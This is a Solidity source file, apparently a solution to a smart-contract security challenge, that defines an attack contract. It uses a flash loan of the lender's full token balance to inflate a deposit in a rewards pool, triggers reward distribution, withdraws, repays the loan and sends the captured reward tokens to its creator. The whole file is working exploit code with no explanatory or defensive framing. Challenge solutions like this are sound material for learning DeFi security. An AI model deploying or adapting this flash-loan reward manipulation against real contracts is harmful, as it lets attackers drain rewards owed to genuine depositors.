// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface FlashLoanLenderInterface{
    function flashLoan(uint256 amount) external;
}

interface RewarderInterface{
    function deposit(uint256 amount) external;

    function withdraw(uint256 amount) external;

    function distributeRewards() external returns (uint256 rewards);

    function isNewRewardsRound() external view returns (bool);
}

interface ERC20{
    function balanceOf(address user) external returns(uint256 amount);
    function approve(address spender, uint256 amount) external;
    function transfer(address receiver, uint256 amount) external;
}

contract AttackContractRewarder {

    RewarderInterface public immutable rewarder;
    FlashLoanLenderInterface public immutable lender;
    ERC20 public immutable liquidityToken;
    ERC20 public immutable rewarderToken;
    address public immutable creator;

    constructor(address rewarderAddress, address lenderAddress, address tokenAddress, address rewarderTokenAddress){
        creator = msg.sender;
        rewarder = RewarderInterface(rewarderAddress);
        lender = FlashLoanLenderInterface(lenderAddress);
        liquidityToken = ERC20(tokenAddress);
        rewarderToken = ERC20(rewarderTokenAddress);
    }

    function solveChallenge() public {
        lender.flashLoan(liquidityToken.balanceOf(address(lender)));
    }

    function receiveFlashLoan(uint256 amount) public {
        liquidityToken.approve(address(rewarder), amount);
        rewarder.deposit(amount);
        rewarder.distributeRewards();
        rewarder.withdraw(amount);
        liquidityToken.transfer(address(lender), amount);
        rewarderToken.transfer(creator, rewarderToken.balanceOf(address(this)));
    }
}